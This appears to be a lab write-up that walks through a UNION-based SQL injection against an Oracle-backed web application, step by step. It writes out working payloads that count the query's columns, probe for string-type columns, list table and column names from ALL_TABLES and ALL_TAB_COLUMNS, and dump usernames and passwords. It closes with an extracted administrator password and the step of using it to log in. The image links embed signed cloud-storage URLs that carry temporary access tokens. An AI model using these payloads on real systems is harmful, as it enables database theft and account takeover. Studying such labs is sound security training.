# Listing the database contents on Oracle database.

**STEP #1**

Determine the number of columns returned by the original query.

```text
' ORDER BY 1--
```

![](https://miro.medium.com/v2/resize:fit:700/0*RPJRor8IdZC7Ib_t)

```text
' ORDER BY 2--
```

![](https://miro.medium.com/v2/resize:fit:700/0*_T6LLNa9qwkWRm-g)

```text
' ORDER BY 3--
```

![](https://miro.medium.com/v2/resize:fit:700/0*6o_cR09enYU_U8PS)

```text
' ORDER BY 3--                           → Returns an error message.
```

**Therefore there are 2 columns returned by the original query.**

**STEP #2**

Discover the column that contains the data type string.

**NOTE**

`' UNION SELECT NULL, NULL-- `**returns an error message. Therefore you can make a guess that the database might be Oracle.**

![](https://miro.medium.com/v2/resize:fit:700/0*ZSORyG6-bFJm5eky)

```text
' UNION SELECT 'a', NULL FROM DUAL--
```

![](https://miro.medium.com/v2/resize:fit:700/0*4xkIIOJbvVxq6rWg)

```text
' UNION SELECT NULL, 'a' FROM DUAL--
```

![](https://miro.medium.com/v2/resize:fit:700/0*bxnCaG6WLBhuYcAp)

```text
' UNION SELECT 'a', NULL FROM DUAL--   →Returns a 200 status code' UNION SELECT NULL, 'a' FROM DUAL--   →Returns a 200 status code
```

Therefore both column 1 and 2 contain that data type string.

**STEP #3**

Determine the table names.

```text
' UNION SELECT TABLE_NAME, NULL FROM ALL_TABLES--
```

![](https://miro.medium.com/v2/resize:fit:700/0*0CxW812qQQf9_TiW)

Let’s find a table which contains usernames and passwords.

![](https://miro.medium.com/v2/resize:fit:700/0*4NHKFGCB_bT_Qigx)

Table name: `USERS_KDXGKJ`

**STEP #4**

Determine the column names of the table** **`USERS_KDXGKJ`**.**

```text
' UNION SELECT COLUMN_NAME, NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'USERS_KDXGKJ'--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/e308f541-4e56-4255-bd10-524cee85e1b9/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466V7MHV3GM%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210252Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDU0HLcvFkK3dMckdF9xKp3jikUISMQguvRTS8u3OGQGQIhAKGfDfKU1Nb12l3ajUFNoBxd3Yc8jtmo%2FDHOb7PPalfMKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxWFzA%2F2O%2Brvj7gS64q3ANERck7iQrrIB6viQLCMk4cbsbxp3x%2BLs3rTVzo7qrNvJLkc2kWWTWipAUum4T2rDf6qwnE7KDovUC%2FLKNKtI1U1P2xAkuM5N4CI%2Fyge%2Fe76IdWNQfIfxMm5NJfGjY%2FGReHG8NFLlDtFkLGKm4KwTM%2BXR%2Fps%2FzOqa51RSCmNOibX3YwcUPMqjcyRMnRZqSiEa2mSYtZmdpXlaanJbikYzFlmwAimXFSrNtl1MIHS4AOCiQ820u0IEwZESYx%2BXd44wHc3%2FKvgqpQuFg64kXCoAJ7PowIYsUgXkyU3r5skXHRb7A1qPBEGtiEORc%2BlkHwlq7nxjwLkDftJXLgkB%2FVYVe3JxiFO4XmEK6%2B6JrBIXaazDKehMbTSIgSIuYJVg76Bj7sP5%2F5ZMUm3xn6eJBCbwrh4Dwr5ZS6seUDPI88elEUk%2FSL10LyYnkRk6M3j7Lmtt%2FSsQ%2BGtRX5KGUh48zQNZ4Sspk6r1vCcVizFeue6dRm9U%2FlvlXBm5EOoy7Lyeqn3M8jfeerhunRCZarUgJ9vPraFlFywccpYd0w2FHzzuH0qxBU7OjiC2bkSo%2FrZEUUbIPu%2Fvz%2BE7Brc9XcQm2Zhd7FG6X6rzyBZc%2BNcA%2FJtFU%2FqkTtIHzdlcRuBST9iDCuxqLUBjqkAUbM9vc6mHpO%2FkL4qxGgPXroYCO7bxxQHhoNeArqk%2BvBfNi%2FJDOk8IKdbNOCg96YP4G7xsMNxUmHOL8UYVn1es3%2FCJNz%2B2pvGbk3HGKNlIDPLvM7OaCptNsvDtKn%2Bj41%2F5eBsjdNKAjVKzvk4nQsnbwhsdJlwmjnRMw2%2F9qWx5REXOAN4dz%2BBnV8nGIpKXrGemm9lGtn06ZZSHRZCM%2B2YaXWx9at&X-Amz-Signature=0cd1ff021cba30d709131ca64fb2fb6c72254e198fa0e56684110cee1fc827d8&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**There are two columns in the table **`USERS_KDXGKJ`**.**

`username: USERNAME_CSUMYK`

`password: PASSWORD_AIOQBO`

---

**STEP #5**

Retrieve the administrator user’s password from the database.

```text
' UNION SELECT USERNAME_CSUMYK, PASSWORD_AIOQBO FROM USERS_KDXGKJ--
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/3ab7ff68-30f8-4bf2-937a-fe782827a0b9/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466V7MHV3GM%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210252Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDU0HLcvFkK3dMckdF9xKp3jikUISMQguvRTS8u3OGQGQIhAKGfDfKU1Nb12l3ajUFNoBxd3Yc8jtmo%2FDHOb7PPalfMKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxWFzA%2F2O%2Brvj7gS64q3ANERck7iQrrIB6viQLCMk4cbsbxp3x%2BLs3rTVzo7qrNvJLkc2kWWTWipAUum4T2rDf6qwnE7KDovUC%2FLKNKtI1U1P2xAkuM5N4CI%2Fyge%2Fe76IdWNQfIfxMm5NJfGjY%2FGReHG8NFLlDtFkLGKm4KwTM%2BXR%2Fps%2FzOqa51RSCmNOibX3YwcUPMqjcyRMnRZqSiEa2mSYtZmdpXlaanJbikYzFlmwAimXFSrNtl1MIHS4AOCiQ820u0IEwZESYx%2BXd44wHc3%2FKvgqpQuFg64kXCoAJ7PowIYsUgXkyU3r5skXHRb7A1qPBEGtiEORc%2BlkHwlq7nxjwLkDftJXLgkB%2FVYVe3JxiFO4XmEK6%2B6JrBIXaazDKehMbTSIgSIuYJVg76Bj7sP5%2F5ZMUm3xn6eJBCbwrh4Dwr5ZS6seUDPI88elEUk%2FSL10LyYnkRk6M3j7Lmtt%2FSsQ%2BGtRX5KGUh48zQNZ4Sspk6r1vCcVizFeue6dRm9U%2FlvlXBm5EOoy7Lyeqn3M8jfeerhunRCZarUgJ9vPraFlFywccpYd0w2FHzzuH0qxBU7OjiC2bkSo%2FrZEUUbIPu%2Fvz%2BE7Brc9XcQm2Zhd7FG6X6rzyBZc%2BNcA%2FJtFU%2FqkTtIHzdlcRuBST9iDCuxqLUBjqkAUbM9vc6mHpO%2FkL4qxGgPXroYCO7bxxQHhoNeArqk%2BvBfNi%2FJDOk8IKdbNOCg96YP4G7xsMNxUmHOL8UYVn1es3%2FCJNz%2B2pvGbk3HGKNlIDPLvM7OaCptNsvDtKn%2Bj41%2F5eBsjdNKAjVKzvk4nQsnbwhsdJlwmjnRMw2%2F9qWx5REXOAN4dz%2BBnV8nGIpKXrGemm9lGtn06ZZSHRZCM%2B2YaXWx9at&X-Amz-Signature=87a233e564a6f68ead16cc0aab6f09543d08760765fb7ffa7678511a63f7c5a9&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

| administrator | r1xyd5uo3kcovvqm73jl |
Use the password to get administrators access to the web application.

